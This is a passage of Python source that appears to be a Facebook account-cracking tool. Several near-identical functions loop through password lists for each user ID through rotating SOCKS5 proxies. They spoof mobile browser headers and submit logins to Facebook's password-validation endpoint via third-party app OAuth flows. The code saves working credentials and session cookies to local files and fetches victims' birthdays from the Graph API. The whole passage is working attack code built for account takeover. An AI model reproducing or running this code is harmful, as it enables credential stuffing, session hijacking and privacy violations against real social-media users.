ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr');dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,};koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]);koki+=' m_pixel_ratio=2.625; wd=412x756';heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'};po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"};coki=po.cookies.get_dict();kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s|%s"%(H,uiz,pw));______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s "%(H,kuki));______Hikmat_Ganteng_Banget_Coy______(f"\r {P}*--> {ua}");open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
				try:
					token = open('token.txt','r').read();cuki = {"cookie":open('cookie.txt','r').read()};ttl = ses.get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cuki).json()['birthday'];m, d, y = ttl.split('/');m = tete[m];______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}|{d} {m} {y}");HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
				except:
					______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}")
					#HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
			else:continue
		except requests.exceptions.ConnectionError:turu(31)
	HikmatXD+=1
	
def metode_web_new(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua = random.choice(all_ua);ses = requests.Session();runc= random.choice([K,M,U,O,B,H]);tod = random.choice(["|","/","-","\\"])
	_________FRANKESTEIN________HIKMAT_______XYZ_______.update(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____,description=f"\r {runc}{tod} {P}{len(id2)}/{HikmatXD} {H}ok:{ok} {K}cp:{cp} ")
	_________FRANKESTEIN________HIKMAT_______XYZ_______.advance(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____)
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines();cuukk=random.choice(proxff);proxs= {'http': 'socks5://'+cuukk};ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'});p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1301198813362609%26cbt%3D1661737885257%26e2e%3D%257B%2522init%2522%253A1661737885257%257D%26ies%3D0%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252248c9a4fc-b4e8-4f94-b909-927ad9e47a55%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mv60rgtium84i2cu12d9%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1301198813362609%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D48c9a4fc-b4e8-4f94-b909-927ad9e47a55%26tp%3Dunspecified&cancel_url=fb1301198813362609%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252248c9a4fc-b4e8-4f94-b909-927ad9e47a55%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mv60rgtium84i2cu12d9%2522%257D%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr');dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https%3A%2F%2F"+link_okep+"%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1301198813362609%26cbt%3D1661737885257%26e2e%3D%257B%2522init%2522%253A1661737885257%257D%26ies%3D0%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252248c9a4fc-b4e8-4f94-b909-927ad9e47a55%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mv60rgtium84i2cu12d9%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1301198813362609%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D48c9a4fc-b4e8-4f94-b909-927ad9e47a55%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,};koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]);koki+=' m_pixel_ratio=2.625; wd=412x756';heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1301198813362609%26cbt%3D1661737885257%26e2e%3D%257B%2522init%2522%253A1661737885257%257D%26ies%3D0%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252248c9a4fc-b4e8-4f94-b909-927ad9e47a55%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mv60rgtium84i2cu12d9%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1301198813362609%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D48c9a4fc-b4e8-4f94-b909-927ad9e47a55%26tp%3Dunspecified&cancel_url=fb1301198813362609%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252248c9a4fc-b4e8-4f94-b909-927ad9e47a55%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mv60rgtium84i2cu12d9%2522%257D%23_%3D_&display=touch&locale=jv_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'};po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"};coki=po.cookies.get_dict();kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s|%s"%(H,uiz,pw));______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s "%(H,kuki));______Hikmat_Ganteng_Banget_Coy______(f"\r {P}*--> {ua}");open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
				try:
					token = open('token.txt','r').read();cuki = {"cookie":open('cookie.txt','r').read()};ttl = ses.get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cuki).json()['birthday'];m, d, y = ttl.split('/');m = tete[m];______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}|{d} {m} {y}");HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
				except:
					______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}")
					#HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
			else:continue
		except requests.exceptions.ConnectionError:turu(31)
	HikmatXD+=1
	
def metode_brainly(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua = random.choice(all_ua);ses = requests.Session();runc= random.choice([K,M,U,O,B,H]);tod = random.choice(["|","/","-","\\"])
	_________FRANKESTEIN________HIKMAT_______XYZ_______.update(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____,description=f"\r {runc}{tod} {P}{len(id2)}/{HikmatXD} {H}ok:{ok} {K}cp:{cp} ")
	_________FRANKESTEIN________HIKMAT_______XYZ_______.advance(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____)
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines();cuukk=random.choice(proxff);proxs= {'http': 'socks5://'+cuukk};ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'});p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D546387748750105%26cbt%3D1661798493840%26e2e%3D%257B%2522init%2522%253A1661798493840%257D%26ies%3D1%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f44066b5-bd6e-4051-b018-2445c8c6613b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522quqv70he6b18kfokn91r%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.co.brainly%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df44066b5-bd6e-4051-b018-2445c8c6613b%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.co.brainly%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f44066b5-bd6e-4051-b018-2445c8c6613b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522quqv70he6b18kfokn91r%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr');dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https%3A%2F%2F"+link_okep+"%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D546387748750105%26cbt%3D1661798493840%26e2e%3D%257B%2522init%2522%253A1661798493840%257D%26ies%3D1%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f44066b5-bd6e-4051-b018-2445c8c6613b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522quqv70he6b18kfokn91r%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.co.brainly%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df44066b5-bd6e-4051-b018-2445c8c6613b%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,};koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]);koki+=' m_pixel_ratio=2.625; wd=412x756';heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https%3A%2F%2F'+link_okep+'%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D546387748750105%26cbt%3D1661798493840%26e2e%3D%257B%2522init%2522%253A1661798493840%257D%26ies%3D1%26sdk%3Dandroid-11.2.0%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f44066b5-bd6e-4051-b018-2445c8c6613b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522quqv70he6b18kfokn91r%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.co.brainly%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df44066b5-bd6e-4051-b018-2445c8c6613b%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.co.brainly%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f44066b5-bd6e-4051-b018-2445c8c6613b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522quqv70he6b18kfokn91r%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'};po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"};coki=po.cookies.get_dict();kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s|%s"%(H,uiz,pw));______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s "%(H,kuki));______Hikmat_Ganteng_Banget_Coy______(f"\r {P}*--> {ua}");open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
				try:
					token = open('token.txt','r').read();cuki = {"cookie":open('cookie.txt','r').read()};ttl = ses.get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cuki).json()['birthday'];m, d, y = ttl.split('/');m = tete[m];______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}|{d} {m} {y}") #HikmatXFX(uiz,pw,all_ua)
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
					break
				except:
					______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}")
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					#HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
			else:continue
		except requests.exceptions.ConnectionError:turu(31)
	HikmatXD+=1
	
def metode_picsart(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua = random.choice(all_ua);ses = requests.Session();runc= random.choice([K,M,U,O,B,H]);tod = random.choice(["|","/","-","\\"])
	_________FRANKESTEIN________HIKMAT_______XYZ_______.update(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____,description=f"\r {runc}{tod} {P}{len(id2)}/{HikmatXD} {H}ok:{ok} {K}cp:{cp} ")
	_________FRANKESTEIN________HIKMAT_______XYZ_______.advance(________HIKMAT_____PUTRA_____BANDUNG_____HARD______CORE____)
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines();cuukk=random.choice(proxff);proxs= {'http': 'socks5://'+cuukk};ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'});p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D108569252539536%26cbt%3D1661821431832%26e2e%3D%257B%2522init%2522%253A1661821431832%257D%26ies%3D1%26sdk%3Dandroid-11.1.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eb3f8783-4975-4231-8192-9005455126c4%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229vk8qk5ses3ga6tpnqid%2522%257D%26default_audience%3Dfriends%26login_behavior%3DWEB_ONLY%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.picsart.studio%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Deb3f8783-4975-4231-8192-9005455126c4%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.picsart.studio%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eb3f8783-4975-4231-8192-9005455126c4%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229vk8qk5ses3ga6tpnqid%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr');dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https%3A%2F%2F"+link_okep+"%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D108569252539536%26cbt%3D1661821431832%26e2e%3D%257B%2522init%2522%253A1661821431832%257D%26ies%3D1%26sdk%3Dandroid-11.1.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eb3f8783-4975-4231-8192-9005455126c4%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229vk8qk5ses3ga6tpnqid%2522%257D%26default_audience%3Dfriends%26login_behavior%3DWEB_ONLY%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.picsart.studio%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Deb3f8783-4975-4231-8192-9005455126c4%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,};koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]);koki+=' m_pixel_ratio=2.625; wd=412x756';heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','accept': '*/*','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https%3A%2F%2F'+link_okep+'%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D108569252539536%26cbt%3D1661821431832%26e2e%3D%257B%2522init%2522%253A1661821431832%257D%26ies%3D1%26sdk%3Dandroid-11.1.0%26sso%3Dchrome_custom_tab%26scope%3Duser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eb3f8783-4975-4231-8192-9005455126c4%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229vk8qk5ses3ga6tpnqid%2522%257D%26default_audience%3Dfriends%26login_behavior%3DWEB_ONLY%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.picsart.studio%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Deb3f8783-4975-4231-8192-9005455126c4%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.picsart.studio%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eb3f8783-4975-4231-8192-9005455126c4%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229vk8qk5ses3ga6tpnqid%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'};po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"};coki=po.cookies.get_dict();kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s|%s"%(H,uiz,pw));______Hikmat_Ganteng_Banget_Coy______("\r %s*--> %s "%(H,kuki));______Hikmat_Ganteng_Banget_Coy______(f"\r {P}*--> {ua}");open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
				try:
